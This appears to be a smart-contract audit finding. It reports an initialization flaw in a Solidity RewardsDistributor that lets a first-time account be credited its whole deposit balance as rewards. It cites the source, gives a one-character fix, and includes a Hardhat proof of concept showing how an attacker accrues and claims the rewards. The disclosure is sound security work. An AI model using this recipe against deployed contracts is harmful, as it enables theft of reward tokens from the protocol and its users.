### Title
Uninitialized `accountIndexOf` accrues a user's full deposit balance as rewards when token index equals `INITIAL_INDEX` - ([File: contracts/RewardsDistributor.sol](contracts/RewardsDistributor.sol))

### Summary
Analogous to CVE-2024-28084 (initialization flaw on first-time/uninitialized state), `RewardsDistributor._calculateTokenDelta` fails to initialize a new account's index to `INITIAL_INDEX` when the token index is exactly `INITIAL_INDEX`. The guard `if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX)` only applies the `INITIAL_INDEX` fallback when the index has *grown past* `1e18`; when it is still exactly `1e18` (fresh token registration, zero-`totalSupply` period, or same-block interaction), `_deltaIndex` becomes `1e18` and `_tokensDelta` equals the account's full token balance.

### Finding Description
In `contracts/RewardsDistributor.sol`:

```solidity
function _calculateTokenDelta(...) {
    _tokenIndex = _tokenState.index;
    uint256 _accountIndex = accountIndexOf[token_][account_];

    if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
        _accountIndex = INITIAL_INDEX;
    }

    uint256 _deltaIndex = _tokenIndex - _accountIndex;
    _tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
}
``` [1](#0-0) 

A token is registered in `_updateTokenSpeed` with `index = INITIAL_INDEX` (1e18) and the current timestamp: [2](#0-1) 

The index only grows in `_calculateTokenIndex` when `_deltaTimestamps > 0 && _speed > 0`, and even then the ratio is `0` while `token_.totalSupply() == 0`: [3](#0-2) 

Therefore, in two reachable states the stored index stays exactly `INITIAL_INDEX`:

1. Any transaction executed in the same block/timestamp as `updateTokenSpeed` (backrun of the governor's registration tx — no privileged role needed).
2. Any period where the reward token's `totalSupply()` is `0` (index stays pinned at `INITIAL_INDEX` indefinitely).

In those states a first-time account (`accountIndexOf == 0`) skips the fallback, computes `_deltaIndex = INITIAL_INDEX - 0 = 1e18`, and `wadMul(balance, 1e18) = balance` is credited in `tokensAccruedOf` via `_updateTokensAccruedOf`: [4](#0-3) 

`updateBeforeMintOrBurn` is permissionless ("This function also may be called by anyone"), so the attacker triggers it directly on any `DepositToken`/`DebtToken` registered in the distributor: [5](#0-4) 

`claimRewards` then pays out `tokensAccruedOf` as long as the distributor holds enough `rewardToken`: [6](#0-5) 

### Impact Explanation
Direct theft of the reward token (e.g., MET on the deployed `MetRewardsDistributor`) proportional to the attacker's deposit-token balance. An attacker holding `B` deposit tokens in a zero-supply/freshly-registered reward token accrues `B` reward tokens instead of ~0, draining up to the distributor's full reward balance. The reward-token invariant (accrual proportional to time × speed × share) is broken by the uninitialized `accountIndexOf` default.

### Likelihood Explanation
Requires only an unprivileged account and a state where `tokenStates[token_].index == INITIAL_INDEX` — trivially reachable by depositing into a reward token whose underlying `totalSupply()` is 0, or by backrunning `updateTokenSpeed`. `updateBeforeMintOrBurn` is called automatically inside `DepositToken`/`DebtToken` mint paths via `updateRewardsBeforeMintOrBurn`, so even an ordinary deposit can trigger the accrual. No pause, cap, or guard blocks it; `claimRewards` has no access control on the amount beyond contract balance.

### Recommendation
Initialize `_accountIndex` to `INITIAL_INDEX` whenever `_accountIndex == 0 && _tokenIndex >= INITIAL_INDEX` (use `>=` instead of `>`), so a first-time account's delta is measured from the index baseline rather than from zero.

### Proof of Concept
Hardhat sketch (mirrors `test/RewardDistributor.test.ts` setup, where `DEFAULT_INDEX = 1e18`):

```ts
// governor registers reward token with nonzero speed; index = INITIAL_INDEX = 1e18
await rewardDistributor.updateTokenSpeed(msdToken.address, parseEther('1'));

// attacker holds deposit tokens; keep totalSupply == 0 so the index never grows
msdToken.totalSupply.returns(0);
msdToken.balanceOf.whenCalledWith(attacker.address).returns(parseEther('100'));

// same block or any later time while totalSupply == 0: index still == INITIAL_INDEX
await rewardDistributor
  .connect(attacker)
  .updateBeforeMintOrBurn(msdToken.address, attacker.address);

// BUG: accrued = 100 * wadMul(1e18) = 100 reward tokens instead of 0
expect(await rewardDistributor.tokensAccruedOf(attacker.address)).to.eq(parseEther('100'));

// fund distributor and claim
await rewardToken.mint(rewardDistributor.address, parseEther('100'));
await rewardDistributor['claimRewards(address)'](attacker.address);
expect(await rewardToken.balanceOf(attacker.address)).to.eq(parseEther('100'));
```

The same result occurs when backrunning `updateTokenSpeed` in the same block (`_deltaTimestamps == 0` keeps `index == INITIAL_INDEX`) even with nonzero `totalSupply`.

### Citations

**File:** contracts/RewardsDistributor.sol (L175-180)
```text
    function updateBeforeMintOrBurn(IERC20 token_, address account_) external override {
        if (tokenStates[token_].index > 0) {
            _updateTokenIndex(token_);
            _updateTokensAccruedOf(token_, account_);
        }
    }
```

**File:** contracts/RewardsDistributor.sol (L197-212)
```text
    function _calculateTokenIndex(
        TokenState memory _supplyState,
        IERC20 token_
    ) private view returns (uint224 _newIndex, uint32 _newTimestamp) {
        uint256 _speed = tokenSpeeds[token_];
        uint256 _deltaTimestamps = block.timestamp - uint256(_supplyState.timestamp);
        if (_deltaTimestamps > 0 && _speed > 0) {
            uint256 _totalSupply = token_.totalSupply();
            uint256 _tokensAccrued = _deltaTimestamps * _speed;
            uint256 _ratio = _totalSupply > 0 ? _tokensAccrued.wadDiv(_totalSupply) : 0;
            _newIndex = (_supplyState.index + _ratio).toUint224();
            _newTimestamp = block.timestamp.toUint32();
        } else if (_deltaTimestamps > 0 && _supplyState.index > 0) {
            _newTimestamp = block.timestamp.toUint32();
        }
    }
```

**File:** contracts/RewardsDistributor.sol (L217-231)
```text
    function _calculateTokenDelta(
        TokenState memory _tokenState,
        IERC20 token_,
        address account_
    ) private view returns (uint256 _tokenIndex, uint256 _tokensDelta) {
        _tokenIndex = _tokenState.index;
        uint256 _accountIndex = accountIndexOf[token_][account_];

        if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
            _accountIndex = INITIAL_INDEX;
        }

        uint256 _deltaIndex = _tokenIndex - _accountIndex;
        _tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
    }
```

**File:** contracts/RewardsDistributor.sol (L248-256)
```text
    function _transferRewardIfEnoughTokens(address account_, uint256 amount_) private {
        IERC20 _rewardToken = rewardToken;
        uint256 _balance = _rewardToken.balanceOf(address(this));
        if (amount_ > 0 && amount_ <= _balance) {
            tokensAccruedOf[account_] = 0;
            _rewardToken.safeTransfer(account_, amount_);
            emit RewardClaimed(account_, amount_);
        }
    }
```

**File:** contracts/RewardsDistributor.sol (L261-266)
```text
    function _updateTokensAccruedOf(IERC20 token_, address account_) private {
        (uint256 _tokenIndex, uint256 _tokensDelta) = _calculateTokenDelta(tokenStates[token_], token_, account_);
        accountIndexOf[token_][account_] = _tokenIndex;
        tokensAccruedOf[account_] = tokensAccruedOf[account_] + _tokensDelta;
        emit TokensAccruedUpdated(token_, account_, _tokensDelta, _tokenIndex);
    }
```

**File:** contracts/RewardsDistributor.sol (L294-304)
```text
        } else if (newSpeed_ > 0) {
            // Add token to the list
            if (tokenStates[token_].index == 0) {
                if (tokens.length == MAX_REWARD_TOKENS) revert ReachedMaxRewardTokens();
                tokenStates[token_] = TokenState({index: INITIAL_INDEX, timestamp: block.timestamp.toUint32()});
                tokens.push(token_);
            } else {
                // Update timestamp to ensure extra interest is not accrued during the prior period
                tokenStates[token_].timestamp = block.timestamp.toUint32();
            }
        }
```
